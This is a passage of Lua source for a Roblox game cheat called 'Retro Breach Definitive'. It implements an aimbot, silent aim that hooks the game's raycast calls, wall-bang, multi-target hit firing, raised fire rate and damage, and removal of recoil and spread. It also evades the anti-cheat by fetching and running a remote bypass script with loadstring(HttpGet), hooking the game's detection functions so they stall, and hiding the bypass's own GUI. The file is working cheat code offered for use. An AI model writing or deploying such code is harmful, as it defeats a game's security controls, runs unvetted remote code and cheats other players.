            if handle and handle.Parent then
                local distance = (handle.Position - myRoot.Position).Magnitude
                if distance <= ITEM_ESP_DISTANCE then
                    itemsInRange[item] = true
                    if espData.nameText then
                        local itemPos3D = handle.Position + Vector3.new(0, handle.Size.Y/2 + 1, 0)
                        local itemPos, onScreen = Camera:WorldToViewportPoint(itemPos3D)
                        espData.nameText.Position = Vector2.new(itemPos.X, itemPos.Y)
                        espData.nameText.Visible = onScreen
                    end
                end
            end
        end
    end
    for item, espData in pairs(ItemHighlights) do
        if not item or not item.Parent or not itemsInRange[item] then
            if espData.highlight then pcall(function() espData.highlight:Destroy() end) end
            if espData.nameText then pcall(function() espData.nameText:Remove() end) end
            ItemHighlights[item] = nil
        end
    end
end

local _Players = Players
local _LocalPlayer = LocalPlayer
local _Camera = Camera
local _UserInputService = UserInputService
local _getHead = getHead
local _getHumanoid = getHumanoid
local _Vector2_new = Vector2.new
local _CFrame_new = CFrame.new
local _pcall = pcall

local function getClosestPlayer()
    local success, result = _pcall(function()
        local closestPlayer = nil
        local shortestDistance = Config.AimbotFOV
        local allPlayers = _Players:GetPlayers()
        local playerCount = #allPlayers
        
        for i = 1, playerCount do
            local player = allPlayers[i]
            if player ~= _LocalPlayer and player.Character then
                local head = _getHead(player.Character)
                local humanoid = _getHumanoid(player.Character)
                if head and humanoid and humanoid.Health > 0 then
                    local passTeamCheck = true
                    if Config.IgnoreAlly and player.Team and _LocalPlayer.Team then
                        if areTeamsAllied(_LocalPlayer.Team.Name, player.Team.Name) then
                            passTeamCheck = false
                        end
                    end
                    
                    if passTeamCheck then
                        -- Wall check using Raycast
                        local passWallCheck = true
                        if Config.WallCheck then  -- Only check walls if WallCheck is enabled
                            local myChar = _LocalPlayer.Character
                            local myHead = myChar and _getHead(myChar)
                            
                            if myHead then
                                local rayOrigin = myHead.Position
                                local rayDirection = (head.Position - rayOrigin).Unit * (head.Position - rayOrigin).Magnitude
                                
                                local raycastParams = RaycastParams.new()
                                raycastParams.FilterDescendantsInstances = {myChar, player.Character}
                                raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                                
                                local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
                                
                                if raycastResult then
                                    passWallCheck = false  -- Hit a wall
                                end
                            end
                        end
                        
                        if passWallCheck then
                            local screenPos, onScreen = _Camera:WorldToViewportPoint(head.Position)
                            if onScreen then
                                local mousePos = _UserInputService:GetMouseLocation()
                                local distance = (_Vector2_new(screenPos.X, screenPos.Y) - mousePos).Magnitude
                                if distance < shortestDistance then
                                    shortestDistance = distance
                                    closestPlayer = player
                                end
                            end
                        end
                    end
                end
            end
        end
        return closestPlayer
    end)
    return success and result or nil
end

local function getClosestPlayerForSilentAim()
    local success, result = _pcall(function()
        local closestPlayer = nil
        local shortestDistance = Config.SilentAimFOV
        local allPlayers = _Players:GetPlayers()
        local playerCount = #allPlayers
        
        for i = 1, playerCount do
            local player = allPlayers[i]
            if player ~= _LocalPlayer and player.Character then
                local head = _getHead(player.Character)
                local humanoid = _getHumanoid(player.Character)
                if head and humanoid and humanoid.Health > 0 then
                    local passTeamCheck = true
                    if Config.IgnoreAlly and player.Team and _LocalPlayer.Team then
                        if areTeamsAllied(_LocalPlayer.Team.Name, player.Team.Name) then
                            passTeamCheck = false
                        end
                    end
                    
                    if passTeamCheck then
                        -- Wall check using Raycast
                        local passWallCheck = true
                        if Config.WallCheck then  -- Only check walls if WallCheck is enabled
                            local myChar = _LocalPlayer.Character
                            local myHead = myChar and _getHead(myChar)
                            
                            if myHead then
                                local rayOrigin = myHead.Position
                                local rayDirection = (head.Position - rayOrigin).Unit * (head.Position - rayOrigin).Magnitude
                                
                                local raycastParams = RaycastParams.new()
                                raycastParams.FilterDescendantsInstances = {myChar, player.Character}
                                raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                                
                                local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
                                
                                if raycastResult then
                                    passWallCheck = false  -- Hit a wall
                                end
                            end
                        end
                        
                        if passWallCheck then
                            local screenPos, onScreen = _Camera:WorldToViewportPoint(head.Position)
                            if onScreen then
                                local mousePos
                                if Config.MobileAiming or _UserInputService.TouchEnabled then
                                    mousePos = Vector2.new(_Camera.ViewportSize.X / 2, _Camera.ViewportSize.Y / 2)
                                else
                                    mousePos = _UserInputService:GetMouseLocation()
                                end
                                
                                local distance = (_Vector2_new(screenPos.X, screenPos.Y) - mousePos).Magnitude
                                if distance < shortestDistance then
                                    shortestDistance = distance
                                    closestPlayer = player
                                end
                            end
                        end
                    end
                end
            end
        end
        return closestPlayer
    end)
    return success and result or nil
end

-- Get ALL valid targets for multi-hit
local function getAllValidTargets()
    local success, result = _pcall(function()
        local validTargets = {}
        local allPlayers = _Players:GetPlayers()
        local playerCount = #allPlayers
        
        for i = 1, playerCount do
            local player = allPlayers[i]
            if player ~= _LocalPlayer and player.Character then
                local head = _getHead(player.Character)
                local humanoid = _getHumanoid(player.Character)
                if head and humanoid and humanoid.Health > 0 then
                    -- Team check
                    local passTeamCheck = true
                    if Config.IgnoreAlly and player.Team and _LocalPlayer.Team then
                        if areTeamsAllied(_LocalPlayer.Team.Name, player.Team.Name) then
                            passTeamCheck = false
                        end
                    end
                    
                    if passTeamCheck then
                        -- Wall check
                        local passWallCheck = true
                        if Config.WallCheck then
                            local myChar = _LocalPlayer.Character
                            local myHead = myChar and _getHead(myChar)
                            
                            if myHead then
                                local rayOrigin = myHead.Position
                                local rayDirection = (head.Position - rayOrigin).Unit * (head.Position - rayOrigin).Magnitude
                                
                                local raycastParams = RaycastParams.new()
                                raycastParams.FilterDescendantsInstances = {myChar, player.Character}
                                raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                                
                                local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
                                
                                if raycastResult then
                                    passWallCheck = false
                                end
                            end
                        end
                        
                        if passWallCheck then
                            -- FOV check
                            local screenPos, onScreen = _Camera:WorldToViewportPoint(head.Position)
                            if onScreen then
                                local mousePos = _UserInputService:GetMouseLocation()
                                local distance = (_Vector2_new(screenPos.X, screenPos.Y) - mousePos).Magnitude
                                if distance < Config.SilentAimFOV then
                                    table.insert(validTargets, {player = player, head = head})
                                end
                            end
                        end
                    end
                end
            end
        end
        return validTargets
    end)
    return success and result or {}
end

-- Cycle-Shot System Hook (Less detectable than multi-hit)
task.spawn(function()
    -- Wait for BridgeNet2 and weapon remote to load
    task.wait(2)
    
    local success, BridgeNet2 = pcall(function()
        return require(ReplicatedStorage.Assets.Modules.BridgeNet2)
    end)
    
    if success and BridgeNet2 then
        local repHitRemote = BridgeNet2.ClientBridge("__repHit")
        
        if repHitRemote then
            -- Cycle-shot state
            local shooting = false
            local currentTargetIndex = 1
            local lastShotTime = 0
            
            UserInputService.InputBegan:Connect(function(input, gameProcessed)
                if input.UserInputType == Enum.UserInputType.MouseButton1 and not gameProcessed then
                    shooting = true
                end
            end)
            
            UserInputService.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 then
                    shooting = false
                    currentTargetIndex = 1  -- Reset cycle when you stop shooting
                end
            end)
            
            -- Cycle-shot logic on RenderStepped
            RunService.RenderStepped:Connect(function()
                if Config.CycleShot and Config.SilentAim and shooting then
                    local currentTime = tick()
                    -- Fire once per 0.05 seconds (matches rapid fire speed)
                    if currentTime - lastShotTime >= 0.05 then
                        local targets = getAllValidTargets()
                        
                        if #targets > 0 then
                            -- Cycle to next target
                            if currentTargetIndex > #targets then
                                currentTargetIndex = 1
                            end
                            
                            local targetData = targets[currentTargetIndex]
                            
                            pcall(function()
                                -- Fire RepHit for current cycle target
                                repHitRemote:Fire({
                                    arg1 = targetData.head.Position,
                                    arg2 = targetData.head
                                })
                            end)
                            
                            currentTargetIndex = currentTargetIndex + 1
                            lastShotTime = currentTime
                        end
                    end
                end
            end)
        end
    end
end)

local FOVCircle = nil
local SilentAimFOVCircle = nil
local FOVCircleGUI = nil
local SilentFOVCircleGUI = nil
local SilentAimHighlight = nil

if Drawing and Drawing.new then
    FOVCircle = Drawing.new("Circle")
    FOVCircle.Visible = false
    FOVCircle.Filled = false
    FOVCircle.Transparency = 1
    FOVCircle.Thickness = 2
    FOVCircle.Color = Color3.fromRGB(255, 255, 255)
    FOVCircle.NumSides = 64
    
    SilentAimFOVCircle = Drawing.new("Circle")
    SilentAimFOVCircle.Visible = false
    SilentAimFOVCircle.Filled = false
    SilentAimFOVCircle.Transparency = 1
    SilentAimFOVCircle.Thickness = 2
    SilentAimFOVCircle.Color = Color3.fromRGB(255, 100, 100)
    SilentAimFOVCircle.NumSides = 64
else
    local fovGui = Instance.new("ScreenGui")
    fovGui.Name = "FOVCircles"
    fovGui.ResetOnSpawn = false
    fovGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    fovGui.DisplayOrder = 999
    fovGui.Parent = LocalPlayer.PlayerGui
    table.insert(_G.RetroBreach.Guis, fovGui)
    
    local function createSimpleCircle(color)
        local frame = Instance.new("Frame")
        frame.AnchorPoint = Vector2.new(0.5, 0.5)
        frame.BackgroundTransparency = 1
        frame.BorderSizePixel = 3
        frame.BorderColor3 = color
        frame.Visible = false
        frame.ZIndex = 999
        frame.Parent = fovGui
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0.5, 0)
        corner.Parent = frame
        
        return frame
    end
    
    FOVCircleGUI = createSimpleCircle(Color3.fromRGB(255, 255, 255))
    SilentFOVCircleGUI = createSimpleCircle(Color3.fromRGB(255, 100, 100))
    
    UILib:CreateNotification({
        Text = "Mobile FOV Circles Enabled",
        Duration = 3
    })
end

local function updateAimbot()
    if Config.Aimbot then
        local isAiming = UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) or Config.MobileAiming
        if isAiming then
            local target = getClosestPlayer()
            if target and target.Character then
                -- Determine target part based on aim assist setting
                local targetPart = nil
                
                if Config.AimAssistTarget == "Head Only" then
                    targetPart = _getHead(target.Character)
                elseif Config.AimAssistTarget == "Body Only" then
                    targetPart = getRoot(target.Character)
                else -- Humanized (70% body, 30% head)
                    local rand = math.random(1, 100)
                    if rand <= 70 then
                        targetPart = getRoot(target.Character) -- 70% body
                    else
                        targetPart = _getHead(target.Character) -- 30% head
                    end
                end
                
                if targetPart then
                    local targetPos, onScreen = Camera:WorldToViewportPoint(targetPart.Position)
                    if onScreen then
                        local distance = (Vector2.new(targetPos.X, targetPos.Y) - Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)).Magnitude
                        if distance <= Config.AimbotFOV then
                            local targetCFrame = CFrame.new(Camera.CFrame.Position, targetPart.Position)
                            Camera.CFrame = Camera.CFrame:Lerp(targetCFrame, 1 / Config.AimbotSmooth)
                        end
                    end
                end
            end
        end
    end
    
    if FOVCircle then
        if Config.Aimbot and Config.ShowAimbotFOV then
            FOVCircle.Visible = true
            FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
            FOVCircle.Radius = Config.AimbotFOV
        else
            FOVCircle.Visible = false
        end
    elseif FOVCircleGUI then
        if Config.Aimbot and Config.ShowAimbotFOV then
            FOVCircleGUI.Visible = true
            FOVCircleGUI.Position = UDim2.new(0.5, 0, 0.5, 0)
            local diameter = Config.AimbotFOV * 2
            FOVCircleGUI.Size = UDim2.new(0, diameter, 0, diameter)
        else
            FOVCircleGUI.Visible = false
        end
    end
    
    if SilentAimFOVCircle then
        if Config.SilentAim and Config.ShowSilentAimFOV then
            SilentAimFOVCircle.Visible = true
            SilentAimFOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
            SilentAimFOVCircle.Radius = Config.SilentAimFOV
        else
            SilentAimFOVCircle.Visible = false
        end
    elseif SilentFOVCircleGUI then
        -- Mobile/Fallback: Use Highlight instead of Circle for Silent Aim
        if Config.SilentAim and Config.ShowSilentAimFOV then
            -- Hide the circle
            SilentFOVCircleGUI.Visible = false
            
            -- Update Highlight
            local target = getClosestPlayer()
            if target and target.Character then
                if not SilentAimHighlight or not SilentAimHighlight.Parent then
                    -- Create new if missing/destroyed
                    SilentAimHighlight = Instance.new("Highlight")
                    SilentAimHighlight.Name = "SilentAimTargetHighlight"
                    SilentAimHighlight.FillColor = Color3.fromRGB(255, 0, 0) -- Red
                    SilentAimHighlight.OutlineTransparency = 1
                    SilentAimHighlight.FillTransparency = 0.5
                    table.insert(_G.RetroBreach.Guis, SilentAimHighlight)
                end
                
                if SilentAimHighlight.Parent ~= target.Character then
                    SilentAimHighlight.Parent = target.Character
                end
            else
                -- No target, hide highlight
                if SilentAimHighlight then
                    SilentAimHighlight.Parent = nil
                end
            end
        else
            SilentFOVCircleGUI.Visible = false
            if SilentAimHighlight then
                SilentAimHighlight.Parent = nil
            end
        end
    end
end
local aimbotConnection = RunService.RenderStepped:Connect(function()
    pcall(updateAimbot)
end)
table.insert(_G.RetroBreach.Connections, aimbotConnection)

local bridgeNet = ReplicatedStorage:WaitForChild("BridgeNet2", 5)
local weaponRemote = bridgeNet and bridgeNet:FindFirstChild("dataRemoteEvent")

if not weaponRemote then
    task.wait(2)
    UILib:CreateNotification({
        Text = "Rapid fire disabled (no remote found)",
        Duration = 5
    })
end

local _firing = false
local _shotsFired = 0

UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        _firing = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        _firing = false
        if Config.RapidFire and _shotsFired > 0 then
            UILib:CreateNotification({
                Text = string.format("Rapid fire: %d shots", _shotsFired),
                Duration = 2
            })
            _shotsFired = 0
        end
    end
end)

local weaponStateTable = nil
local originalDamageValues = {}
local searchFrameCounter = 0
local lastToolEquipped = nil

local function findWeaponState()
    if not getgc then
        return nil
    end
    
    local currentTool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
    if not currentTool then
        return nil
    end
    
    local gcTable = getgc(true)
    local totalObjects = #gcTable
    
    -- Find ALL weapon states with original FireRate, use the one FURTHEST from end
    -- (The active weapon state is usually the oldest/furthest in the search)
    local foundStates = {}
    
    for i = totalObjects, 1, -1 do
        local obj = gcTable[i]
        if type(obj) == "table" then
            if rawget(obj, "cycled") ~= nil and rawget(obj, "wepStats") ~= nil then
                if obj.equipped == currentTool and obj.wepStats then
                    local fireRate = rawget(obj.wepStats, "FireRate")
                    if fireRate and fireRate ~= 1900 then
                        table.insert(foundStates, obj)
                        -- Continue searching to find all of them
                    end
                end
            end
        end
    end
    
    -- Return the LAST one found (furthest from end = most likely active)
    if #foundStates > 0 then
        return foundStates[#foundStates]
    end
    
    return nil
end

local cachedAmmoCount = nil
local ammoGuiCacheTimer = 0

LocalPlayer.CharacterAdded:Connect(function(character)
    task.wait(0.5)
    weaponStateTable = nil
    originalDamageValues = {}
    searchFrameCounter = 0
    lastToolEquipped = nil
    task.wait(0.5)
    weaponStateTable = findWeaponState()
    
    
    local lastChildAddTime = 0
    character.ChildAdded:Connect(function(child)
        local now = tick()
        if child:IsA("Tool") and (now - lastChildAddTime) > 0.1 then
            lastChildAddTime = now
            weaponStateTable = nil
            task.spawn(function()
                task.wait(0.3)
                weaponStateTable = findWeaponState()
            end)
        end
    end)
    
    character.ChildRemoved:Connect(function(child)
        if child:IsA("Tool") then
            weaponStateTable = nil
            searchFrameCounter = 0
            
            task.spawn(function()
                task.wait(0.3)
                if not weaponStateTable and character:FindFirstChildOfClass("Tool") then
                    weaponStateTable = findWeaponState()
                end
            end)
        end
    end)
end)

local rapidFireConnection = RunService.Heartbeat:Connect(function()
    local needsWeaponState = Config.RapidFire or Config.NoRecoil or Config.NoSpread or Config.DamageMultiplier ~= 1 or Config.InfiniteAmmo
    
    if needsWeaponState and weaponStateTable then
        if weaponStateTable and weaponStateTable.wepStats then
            pcall(function()
                local stats = weaponStateTable.wepStats
                
                if Config.RapidFire then
                    if rawget(stats, "FireRate") then
                        local currentRate = stats.FireRate
                        if currentRate ~= 1900 then
                            -- Store original fire rate if not stored yet
                            if not originalFireRate then
                                originalFireRate = currentRate
                            end
                            pcall(function()
                                if setreadonly then
                                    setreadonly(stats, false)
                                end
                                rawset(stats, "FireRate", 1900)
                            end)
                        end
                    end
                    if rawget(stats, "FireMode") and stats.FireMode == "Semi" then
                        pcall(function()
                            if setreadonly then
                                setreadonly(stats, false)
                            end
                            rawset(stats, "FireMode", "Auto")
                        end)
                    end
                end
                
                if Config.NoRecoil and rawget(stats, "Recoil") then
                    pcall(function()
                        local recoil = stats.Recoil
                        if setreadonly then
                            setreadonly(recoil, false)
                        end
                        recoil.Vertical = 0
                        recoil.Horizontal = 0
                    end)
                end
                
                if Config.NoSpread and rawget(stats, "Spread") then
                    pcall(function()
                        if setreadonly then
                            setreadonly(stats, false)
                        end
                        rawset(stats, "Spread", 0)
                    end)
                end
                
                if Config.DamageMultiplier ~= 1 then
                    -- BodyDamage
                    if rawget(stats, "BodyDamage") then
                        if not originalDamageValues.BodyDamage then
                            originalDamageValues.BodyDamage = stats.BodyDamage
                        end
                        pcall(function()
                            if setreadonly then
                                setreadonly(stats, false)
                            end
                            local newDamage = originalDamageValues.BodyDamage * Config.DamageMultiplier
                            rawset(stats, "BodyDamage", newDamage)
                        end)
                    end
                    
                    -- Damage table
                    if rawget(stats, "Damage") and type(stats.Damage) == "table" then
                        -- Damage.Headshot
                        if rawget(stats.Damage, "Headshot") then
                            if not originalDamageValues.DamageHeadshot then
                                originalDamageValues.DamageHeadshot = stats.Damage.Headshot
                            end
                            pcall(function()
                                if setreadonly then
                                    setreadonly(stats.Damage, false)
                                end
                                rawset(stats.Damage, "Headshot", originalDamageValues.DamageHeadshot * Config.DamageMultiplier)
                            end)
                        end
                        
                        -- Damage.Body
                        if rawget(stats.Damage, "Body") then
                            if not originalDamageValues.DamageBody then
                                originalDamageValues.DamageBody = stats.Damage.Body
                            end
                            pcall(function()
                                if setreadonly then
                                    setreadonly(stats.Damage, false)
                                end
                                rawset(stats.Damage, "Body", originalDamageValues.DamageBody * Config.DamageMultiplier)
                            end)
                        end
                    end
                else
                    -- Restore original values when multiplier is 1
                    if originalDamageValues.BodyDamage and rawget(stats, "BodyDamage") then
                        pcall(function()
                            if setreadonly then
                                setreadonly(stats, false)
                            end
                            rawset(stats, "BodyDamage", originalDamageValues.BodyDamage)
                        end)
                    end
                    
                    if rawget(stats, "Damage") and type(stats.Damage) == "table" then
                        if originalDamageValues.DamageHeadshot and rawget(stats.Damage, "Headshot") then
                            pcall(function()
                                if setreadonly then
                                    setreadonly(stats.Damage, false)
                                end
                                rawset(stats.Damage, "Headshot", originalDamageValues.DamageHeadshot)
                            end)
                        end
                        
                        if originalDamageValues.DamageBody and rawget(stats.Damage, "Body") then
                            pcall(function()
                                if setreadonly then
                                    setreadonly(stats.Damage, false)
                                end
                                rawset(stats.Damage, "Body", originalDamageValues.DamageBody)
                            end)
                        end
                    end
                end
                
                if Config.NoRecoil then
                    if rawget(stats, "Recoil") then
                        pcall(function()
                            if setreadonly then
                                setreadonly(stats, false)
                            end
                            rawset(stats, "Recoil", 0)
                        end)
                    end
                end
                
                if Config.NoSpread then
                    if rawget(stats, "Spread") then
                        pcall(function()
                            if setreadonly then
                                setreadonly(stats, false)
                            end
                            rawset(stats, "Spread", 0)
                        end)
                    end
                end
            end)
        end
    end
    
    if Config.InfiniteAmmo then
        -- Instant Reload: Speed up reload animation to 50x
        local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
        if tool then
            -- Hook reload animation to make it instant
            local reloadAnim = tool:FindFirstChild("Animations") and tool.Animations:FindFirstChild("Reload")
            if reloadAnim and not reloadAnim:GetAttribute("_InstantReload") then
                reloadAnim:SetAttribute("_InstantReload", true)
                
                -- Modify animation speed when it plays
                local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                local Animator = Humanoid and Humanoid:FindFirstChild("Animator")
                if Animator then
                    Animator.AnimationPlayed:Connect(function(track)
                        if track.Animation == reloadAnim and Config.InfiniteAmmo then
                            track:AdjustSpeed(50)  -- 50x speed = instant reload
                        end
                    end)
                end
            end
            
            ammoGuiCacheTimer = ammoGuiCacheTimer + 1
            if ammoGuiCacheTimer >= 120 or not cachedAmmoCount or not cachedAmmoCount.Parent then
                ammoGuiCacheTimer = 0
                cachedAmmoCount = nil
                pcall(function()
                    local screenGui = LocalPlayer.PlayerGui:FindFirstChild("ScreenGui")
                    if screenGui then
                        local weaponFrame = screenGui:FindFirstChild("WeaponFrame")
                        if weaponFrame then
                            local alignment = weaponFrame:FindFirstChild("Alignment")
                            if alignment then
                                local gunFrame = alignment:FindFirstChild("GunFrame")
                                if gunFrame then
                                    cachedAmmoCount = gunFrame:FindFirstChild("AmmoCount")
                                end
                            end
                        end
                    end
                end)
            end
            
            if cachedAmmoCount and cachedAmmoCount:IsA("TextLabel") then
                cachedAmmoCount.Text = "INF"
            end
        end
    end
end)
table.insert(_G.RetroBreach.Connections, rapidFireConnection)

-- Auto-refresh rapid fire every 5 seconds to keep it working
task.spawn(function()
    while task.wait(5) do
        if Config.RapidFire and weaponStateTable and weaponStateTable.wepStats then
            pcall(function()
                local stats = weaponStateTable.wepStats
                if rawget(stats, "FireRate") then
                    local currentRate = stats.FireRate
                    -- Only re-apply if it's not already at rapid fire value
                    if currentRate ~= 1900 then
                        if not originalFireRate then
                            originalFireRate = currentRate
                        end
                        if setreadonly then
                            setreadonly(stats, false)
                        end
                        rawset(stats, "FireRate", 1900)
                    end
                end
            end)
        end
    end
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/refs/heads/main/Source.lua"))()
end)

task.spawn(function()
    task.wait(0.1)
    for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") then
            for _, child in pairs(gui:GetDescendants()) do
                if child:IsA("TextLabel") or child:IsA("TextButton") then
                    if string.find(string.lower(child.Text or ""), "pixeluted") or 
                       string.find(string.lower(child.Text or ""), "adonis") or
                       string.find(string.lower(child.Text or ""), "bypassed") then
                        gui:Destroy()
                        break
                    end
                end
            end
        end
    end
end)


if getgc and hookfunc and typeof then
    pcall(function()
        for i,v in pairs(getgc(true)) do
            if typeof(v) == "table" and typeof(rawget(v, "Detected")) == "function" then
                hookfunc(rawget(v, "Detected"), function() return task.wait(9e9) end)
            end
        end
    end)
end


local SilentAimTarget = nil
local SilentAimTargetPart = nil
local WallBangPlayerChars = {}

RunService.Heartbeat:Connect(function()
    if Config.SilentAim then
        SilentAimTarget = getClosestPlayerForSilentAim()
        if SilentAimTarget and SilentAimTarget.Character then
            -- Use aim assist target setting for Silent Aim too
            if Config.AimAssistTarget == "Head Only" then
                SilentAimTargetPart = _getHead(SilentAimTarget.Character)
            elseif Config.AimAssistTarget == "Body Only" then
                SilentAimTargetPart = getRoot(SilentAimTarget.Character)
            else -- Humanized (70% body, 30% head)
                local rand = math.random(1, 100)
                if rand <= 70 then
                    SilentAimTargetPart = getRoot(SilentAimTarget.Character) -- 70% body
                else
                    SilentAimTargetPart = _getHead(SilentAimTarget.Character) -- 30% head
                end
            end
        else
            SilentAimTargetPart = nil
        end
    else
        SilentAimTarget = nil
        SilentAimTargetPart = nil
    end
    
    if Config.WallBang then
        WallBangPlayerChars = {}
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character and player ~= LocalPlayer then
                table.insert(WallBangPlayerChars, player.Character)
            end
        end
    end
end)

local Namecall = nil
Namecall = hookmetamethod(game, "__namecall", function(Self, ...)
    local Method = getnamecallmethod()
    local Args = {...}
    
    if not checkcaller() then
        if Method == "Raycast" then
            local debugInfo = debug.getinfo(3)
            if debugInfo and debugInfo.source and typeof(debugInfo.source) == "string" and string.find(debugInfo.source, "WeaponSystem") then
                if SilentAimTargetPart then
                    local Direction = (SilentAimTargetPart.Position - Args[1]).Unit * 1000
                    Args[2] = Direction
                end
                
                if Config.WallBang and Args[3] and #WallBangPlayerChars > 0 then
                    local newParams = RaycastParams.new()
                    newParams.FilterType = Enum.RaycastFilterType.Include
                    newParams.FilterDescendantsInstances = WallBangPlayerChars
                    Args[3] = newParams
                end
            end
            return Namecall(Self, table.unpack(Args))
        end
    end
    
    return Namecall(Self, ...)
end)

UILib:CreateNotification({
    Text = "Silent Aim loaded!",
    Duration = 3
})
local Window = UILib:CreateWindow({
    Title = "Retro Breach Definitive",
    Size = UDim2.fromOffset(550, 400),
    Position = UDim2.fromOffset(100, 100)
})
table.insert(_G.RetroBreach.Guis, Window.ScreenGui)
Window:AddToggleKey(Enum.KeyCode.RightShift)

local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled

if isMobile then
    local toggleButtonGui = Instance.new("ScreenGui")
    toggleButtonGui.Name = "MobileToggleGui"
    toggleButtonGui.ResetOnSpawn = false
    toggleButtonGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    toggleButtonGui.DisplayOrder = 100
    toggleButtonGui.Parent = LocalPlayer.PlayerGui
    table.insert(_G.RetroBreach.Guis, toggleButtonGui)
    
    local mobileToggleButton = Instance.new("TextButton")
    mobileToggleButton.Name = "MobileToggle"
    mobileToggleButton.Size = UDim2.new(0, 50, 0, 50)
    mobileToggleButton.Position = UDim2.new(1, -10, 0, 10)
    mobileToggleButton.AnchorPoint = Vector2.new(1, 0)
    mobileToggleButton.BackgroundColor3 = Color3.fromRGB(255, 20, 147)
    mobileToggleButton.Text = "J"
    mobileToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    mobileToggleButton.TextSize = 24
    mobileToggleButton.Font = Enum.Font.GothamBold
    mobileToggleButton.Parent = toggleButtonGui
    
    local toggleCorner = Instance.new("UICorner")
    toggleCorner.CornerRadius = UDim.new(0, 12)
    toggleCorner.Parent = mobileToggleButton
    
    local toggleStroke = Instance.new("UIStroke")
    toggleStroke.Color = Color3.fromRGB(255, 255, 255)
    toggleStroke.Thickness = 2
    toggleStroke.Parent = mobileToggleButton
    
    mobileToggleButton.MouseButton1Click:Connect(function()
        if Window and Window.ScreenGui then
            Window.ScreenGui.Enabled = not Window.ScreenGui.Enabled
            if Window.ScreenGui.Enabled then
                mobileToggleButton.BackgroundColor3 = Color3.fromRGB(255, 20, 147)
            else
                mobileToggleButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
            end
        end
    end)
    
    -- Mobile Aimbot Button (A)
    local aimbotButton = Instance.new("TextButton")
    aimbotButton.Name = "MobileAimbot"
    aimbotButton.Size = UDim2.new(0, 50, 0, 50)
    aimbotButton.Position = UDim2.new(1, -70, 0, 10) -- Left of J button
    aimbotButton.AnchorPoint = Vector2.new(1, 0)
    aimbotButton.BackgroundColor3 = Color3.fromRGB(255, 20, 147) -- Bright Pink (Default OFF BG?) No, user said OFF = Bright Pink BG?
    -- User said: "toggled off the texxxt iss dark piiink and background bright piink"
    -- "inverted when untoggled" -> Wait.
    -- OFF: Text=DarkPink, BG=BrightPink
    -- ON: Text=BrightPink, BG=DarkPink
    aimbotButton.BackgroundColor3 = Color3.fromRGB(255, 105, 180) -- Bright Pink
    aimbotButton.Text = "A"
    aimbotButton.TextColor3 = Color3.fromRGB(139, 0, 139) -- Dark Pink
    aimbotButton.TextSize = 24
    aimbotButton.Font = Enum.Font.GothamBold
    aimbotButton.Parent = toggleButtonGui
    
    local aimbotCorner = Instance.new("UICorner")
    aimbotCorner.CornerRadius = UDim.new(0, 12)
    aimbotCorner.Parent = aimbotButton
    
    local aimbotStroke = Instance.new("UIStroke")
    aimbotStroke.Color = Color3.fromRGB(255, 255, 255)
    aimbotStroke.Thickness = 2
    aimbotStroke.Parent = aimbotButton
    
    Config.MobileAiming = false
    
    aimbotButton.MouseButton1Click:Connect(function()
        Config.MobileAiming = not Config.MobileAiming
        if Config.MobileAiming then
            -- ON State: Text=Bright, BG=Dark
            aimbotButton.BackgroundColor3 = Color3.fromRGB(139, 0, 139) -- Dark Pink BG
            aimbotButton.TextColor3 = Color3.fromRGB(255, 105, 180) -- Bright Pink Text
        else
            -- OFF State: Text=Dark, BG=Bright
            aimbotButton.BackgroundColor3 = Color3.fromRGB(255, 105, 180) -- Bright Pink BG
            aimbotButton.TextColor3 = Color3.fromRGB(139, 0, 139) -- Dark Pink Text
        end
    end)

    -- Mobile Fly Button (F)
    local flyButton = Instance.new("TextButton")
    flyButton.Name = "MobileFly"
    flyButton.Size = UDim2.new(0, 50, 0, 50)
    flyButton.Position = UDim2.new(1, -130, 0, 10) -- Left of A button
    flyButton.AnchorPoint = Vector2.new(1, 0)
    flyButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    flyButton.Text = "F"
    flyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    flyButton.TextSize = 24
    flyButton.Font = Enum.Font.GothamBold
    flyButton.Parent = toggleButtonGui
    
    local flyCorner = Instance.new("UICorner")
    flyCorner.CornerRadius = UDim.new(0, 12)
    flyCorner.Parent = flyButton
    
    local flyStroke = Instance.new("UIStroke")
    flyStroke.Color = Color3.fromRGB(255, 255, 255)
    flyStroke.Thickness = 2
    flyStroke.Parent = flyButton
    
    flyButton.MouseButton1Click:Connect(function()
        Config.RageFly = not Config.RageFly
        if Config.RageFly then
            flyButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Green for ON
            UILib:CreateNotification({Text = "✈️ Rage Fly Enabled", Duration = 2})
            startFly()
        else
            flyButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100) -- Gray for OFF
            UILib:CreateNotification({Text = "❌ Rage Fly Disabled", Duration = 2})
            stopFly()
        end
    end)
    
